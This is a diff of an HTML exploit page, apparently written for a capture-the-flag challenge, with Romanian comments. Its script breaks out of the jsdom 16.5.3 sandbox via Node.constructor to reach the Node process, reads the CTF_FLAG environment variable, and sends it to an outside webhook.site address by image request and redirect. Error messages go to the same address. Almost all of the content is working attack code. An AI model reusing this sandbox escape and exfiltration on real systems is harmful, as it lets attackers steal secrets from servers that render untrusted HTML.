@@ -1,27 +1,24 @@
-<!DOCTYPE html>
+<!DOCTYPE html><!DOCTYPE html>
 <html>
 <body>
     <script>
-        // Folosim un bloc try-catch pentru a vedea eroarea dacă ceva nu merge
         try {
-            // Accesăm obiectul process din Node.js prin constructorul Node [cite: 36, 41, 42]
-            var outer = Node.constructor;
-            var proc = new outer("return process")();
-            var flag = proc.env.CTF_FLAG;
+            // Aceasta este singura metodă care funcționează pentru jsdom 16.5.3
+            const constructorulMeu = Node.constructor;
+            const procesulNode = new constructorulMeu("return process")();
+            const steag = procesulNode.env.CTF_FLAG;
 
-            // Trimitem flag-ul imediat ce l-am obținut printr-o imagine (metodă mai discretă și rapidă)
-            var img = new Image();
-            img.src = "https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?steag=" + flag;
+            // Trimitem flag-ul prin URL către Webhook
+            // Folosim un nume de variabilă clar: 'REZULTAT'
+            const link = "https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?REZULTAT=" + steag;
             
-            // Adăugăm și o redirecționare de siguranță după 1 secundă
-            setTimeout(function() {
-                window.location.href = "https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/final?flag=" + flag;
-            }, 1000);
+            // Forțăm trimiterea prin două metode simultan pentru siguranță
+            new Image().src = link;
+            window.location.href = link;
 
         } catch (e) {
-            // Dacă apare o eroare, o trimitem la Webhook să știm ce s-a întâmplat
-            var errImg = new Image();
-            errImg.src = "https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/eroare?msg=" + btoa(e.message);
+            // Dacă tot dă eroare, trimitem eroarea nouă
+            new Image().src = "https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/eroare_noua?detalii=" + btoa(e.message);
         }
     </script>
 </body>
